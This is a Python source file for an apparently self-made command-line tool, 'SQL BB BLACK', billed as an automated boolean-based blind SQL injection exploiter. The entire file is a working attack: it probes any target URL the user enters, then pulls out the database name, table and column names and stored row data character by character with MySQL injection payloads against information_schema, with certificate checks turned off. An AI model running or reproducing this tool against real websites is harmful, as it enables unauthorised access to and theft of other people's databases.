import urllib
import requests
import urllib3
from pathlib import Path
from colorama import Fore, Style, init
import string
import time
import sys

RED = "\033[1;91m"
RESET = "\033[0m"

banner = r"""
  ███████╗ ██████╗ ██╗       ██████╗ ██████╗      ██████╗ ██╗      █████╗  ██████╗██╗  ██╗
  ██╔════╝██╔═══██╗██║       ██╔══██╗██╔══██╗     ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝
  ███████╗██║   ██║██║       ██████╔╝██████╔╝     ██████╔╝██║     ███████║██║     █████╔╝ 
  ╚════██║██║   ██║██║       ██╔══██╗██╔══██╗     ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ 
  ███████║╚██████╔╝███████╗  ██████╔╝██████╔╝     ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗
  ╚══════╝ ╚═════╝ ╚══════╝  ╚═════╝ ╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

                     SQL BB BLACK
"""

print(RED + banner + RESET)



init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def load_order_by_payloads(filename: str):
    file_path = Path("payloads") / filename

    payloads = {
        "single_quote": [],
        "double_quote": [],
        "no_quote": []
    }


    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue

            if line.startswith("single_quote:"):
                payloads["single_quote"].append(line.split(":", 1)[1].strip())

            elif line.startswith("double_quote:"):
                payloads["double_quote"].append(line.split(":", 1)[1].strip())

            elif line.startswith("no_quote:"):
                payloads["no_quote"].append(line.split(":", 1)[1].strip())

    return payloads


def discovery_vulnerability(url, payloads):
    result = []

    for quote_type, payload_list in payloads.items():
        responses = []
        for payload in payload_list:
            target_url = url + urllib.parse.quote(payload)
            
            for attempt in range(3):
                try:
                    time.sleep(0.5) 
                    
                   
                    r = requests.get(target_url, verify=False, timeout=10)
                    responses.append(r.text)
                    break 
                    
                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                    if attempt < 2:
                        print(f"[-] Connection lost/reset (Attempt {attempt + 1}/3). Retrying in 5 seconds...")
                        time.sleep(5)
                    else:
                        print(f"[!] Critical error with payload: {payload}. Server is not responding.")
                        responses.append("") 

        is_vulnerable = len(responses) >= 2 and responses[0] != responses[1]

        result.append({
            "type": quote_type,
            "response": responses,
            "vulnerable": is_vulnerable
        })

        if is_vulnerable:
            print(Fore.GREEN + f"VULNERABLE (UNSAFE) --> {quote_type}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"SAFE --> {quote_type}" + Style.RESET_ALL)

    return result


def exploit(data, url):

    session = requests.Session()

    results = {
        "db_name": "",
        "table_names": "",
        "column_names": "",
        "dumped_data": ""
    }


    chars = (
    string.ascii_letters +      
    string.punctuation +         
    string.digits             
)


    for item in data:

        if not item["vulnerable"]:
            continue

        for i in range(1, 51):

            if item["type"] == "single_quote":
                payload = f"' AND 1=IF((SELECT LENGTH(DATABASE()))={i},1,0)#"

            elif item["type"] == "double_quote":
                payload = f'" AND 1=IF((SELECT LENGTH(DATABASE()))={i},1,0)#'

            elif item["type"] == "no_quote":
                payload = f" AND 1=IF((SELECT LENGTH(DATABASE()))={i},1,0)"

            full_url = url + urllib.parse.quote(payload)

            try:
                r = session.get(full_url, verify=False)

            except requests.exceptions.ConnectionError:
                print("Connection lost, pausing for 3 seconds...")
                time.sleep(0.1)
                r = session.get(full_url, verify=False)    
                    

    
            if "1" in r.text:
                results["length_database"] = i 
                print(Fore.GREEN + f"[+] The database name length is equal to {i}" + Style.RESET_ALL)
                break
            
        if "length_database" not in results:
            print(Fore.RED + "[-] Length not found" + Style.RESET_ALL)
            return
        
        
        for i in range(1, results["length_database"] + 1):

            for char in chars:

                if item["type"] == "single_quote":
                    payload = f"' AND 1=IF((SELECT SUBSTRING(DATABASE(),{i},1))='{char}',1,0)#"

                elif item["type"] == "double_quote":
                    payload = f'" AND 1=IF((SELECT SUBSTRING(DATABASE(),{i},1))="{char}",1,0)#'

                elif item["type"] == "no_quote":
                    payload = f" AND 1=IF((SELECT SUBSTRING(DATABASE(),{i},1))='{char}',1,0)#"


                full_url = url + urllib.parse.quote(payload)

                try:
                    r = session.get(full_url, verify=False)

                except requests.exceptions.ConnectionError:
                    print("Connection lost, pausing for 3 seconds...")
                    time.sleep(0.1)
                    r = session.get(full_url, verify=False)

                if "1" in r.text:
                    results["db_name"] += char 
                    print(Fore.YELLOW + f"[+] Found char at {i}: {char}" + Style.RESET_ALL)
                    break
        
        print(Fore.GREEN + f"\n[+] DATABASE NAME LOCALIZED: {results['db_name']}\n" + Style.RESET_ALL)
    
        for i in range(1, 100):
            found_any = False

            for char in chars:
                
                ascii_val = ord(char)
                        
                if item["type"] == "single_quote":
                    
                    payload = f"' AND 1=IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{results['db_name']}'), {i}, 1))={ascii_val}, 1, 0)#"

                elif item["type"] == "double_quote":
                    payload = f'" AND 1=IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=\'{results["db_name"]}\'), {i}, 1))={ascii_val}, 1, 0)#'

                elif item["type"] == "no_quote":
                    payload = f" AND 1=IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{results['db_name']}'), {i}, 1))={ascii_val}, 1, 0)"

                full_url = url + urllib.parse.quote(payload)

               
                for attempt in range(3):
                    try:
                        time.sleep(0.4) 
                        r = session.get(full_url, verify=False, timeout=10)
                        break
                    except requests.exceptions.ConnectionError:
                        print("Connection lost, pausing for 5 seconds...")
                        time.sleep(5)
                else:
                    continue

                if "1" in r.text: 
                    print(Fore.YELLOW + f"[+] Found char at {i}: {char}" + Style.RESET_ALL)
                    results["table_names"] += char 
                    found_any = True
                    break

            if not found_any:
                print(Fore.RED + "[-] No more characters found. Stopping..." + Style.RESET_ALL)
                break

        table_list = results["table_names"].split(",")
        print(Fore.GREEN + f"\n[+] Table available: {table_list}\n" + Style.RESET_ALL)
        

        
        selected_table = input("enter a table name: ").strip()

        if selected_table in table_list:
    
            for i in range(1, 100):
                found_any = False

                for char in chars:
                    sql_char = f"'{char}'" 

                    if item["type"] == "single_quote":
                        
                        payload = f"' AND 1=IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{results['db_name']}' AND table_name='{selected_table}'), {i}, 1)={sql_char}, 1, 0)#"

                    elif item["type"] == "double_quote":
                        payload = f"\"AND 1=IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{results['db_name']}' AND table_name='{selected_table}'), {i}, 1)={sql_char}, 1, 0)#"

                    elif item["type"] == "no_quote":
                        payload = f" AND 1=IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{results['db_name']}' AND table_name='{selected_table}'), {i}, 1)={sql_char}, 1, 0)"       
                    

                    full_url = url + urllib.parse.quote(payload)
                    
                    try:
                        r = session.get(full_url, verify=False)

                    except requests.exceptions.ConnectionError:
                        print("Connection lost, pausing for 3 seconds...")
                        time.sleep(0.1)
                        r = session.get(full_url, verify=False)    
                    
                    if "1" in r.text:
                        print(Fore.YELLOW + f"[+] Found column char at {i}: {char}" + Style.RESET_ALL)
                        results["column_names"] += char
                        found_any = True
                        break 

                if not found_any:
                    print(Fore.RED + "[-] No more columns found. Stopping..." + Style.RESET_ALL)
                    break
                
               
            column_list = results["column_names"].split(",")
            print(Fore.GREEN + f"\n[+] Columns available: {column_list}\n" + Style.RESET_ALL)
            

        selected_column = input("enter a column name: ").strip()
        
        if selected_column in column_list:

            for i in range(1, 100):
                found_any = False

                for char in chars:
                    ascii_val = ord(char)

                    if item["type"] == "single_quote":
                        payload = f"' AND 1=IF(ASCII(SUBSTRING((SELECT {selected_column} FROM {selected_table} LIMIT 0,1), {i}, 1))={ascii_val}, 1, 0)#"

                    elif item["type"] == "double_quote":
                        payload = f"\" AND 1=IF(ASCII(SUBSTRING((SELECT {selected_column} FROM {selected_table} LIMIT 0,1), {i}, 1))={ascii_val}, 1, 0)#"

                    elif item["type"] == "no_quote":
                        payload = f" AND 1=IF(ASCII(SUBSTRING((SELECT {selected_column} FROM {selected_table} LIMIT 0,1), {i}, 1))={ascii_val}, 1, 0)"

                    full_url = url + urllib.parse.quote(payload)
                    
                    
                    for attempt in range(3):
                        try:
                            time.sleep(0.4)
                            r = session.get(full_url, verify=False, timeout=10)
                            break
                        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                            print("Connection lost, pausing for 5 seconds...")
                            time.sleep(5)
                    else:
                        continue   

                    if "1" in r.text:
                        print(Fore.YELLOW + f"[+] Found data char at {i}: {char}" + Style.RESET_ALL)
                        results["dumped_data"] += char
                        found_any = True
                        break 

                if not found_any:
                    break

            
            print(Fore.GREEN + f"\n[🚀] DUMPED DATA/FLAG: {results['dumped_data']}\n" + Style.RESET_ALL)
            sys.exit(0)


    return results




if __name__ == "__main__":
    try:
       
        print(Fore.CYAN + "="*50)
        print("     AUTOMATED BOOLEAN-BASED SQLI EXPLOITER     ")
        print("="*50 + Style.RESET_ALL)

        target_url = input("Enter your target URL: ").strip()
        
        if not target_url:
            print(Fore.RED + "[-] Error: URL cannot be empty." + Style.RESET_ALL)
            sys.exit(1)

        print(Fore.BLUE + "[*] Loading payloads from blind.txt..." + Style.RESET_ALL)
        payloads = load_order_by_payloads("blind.txt")

        print(Fore.BLUE + "[*] Scanning for vulnerabilities..." + Style.RESET_ALL)
        scan_results = discovery_vulnerability(target_url, payloads)

        
        vulnerable_found = any(item.get("vulnerable") for item in scan_results)
        
        if vulnerable_found:
            print(Fore.GREEN + "\n[+] Vulnerable entry point confirmed. Launching exploit phase...\n" + Style.RESET_ALL)
            exploit(scan_results, target_url)
        else:
            print(Fore.RED + "\n[-] Scanning finished. No injection points detected." + Style.RESET_ALL)
            sys.exit(0)

    except KeyboardInterrupt:
        
        print(Fore.RED + "\n[!] Execution interrupted by user. Exiting safely..." + Style.RESET_ALL)
        sys.exit(0)




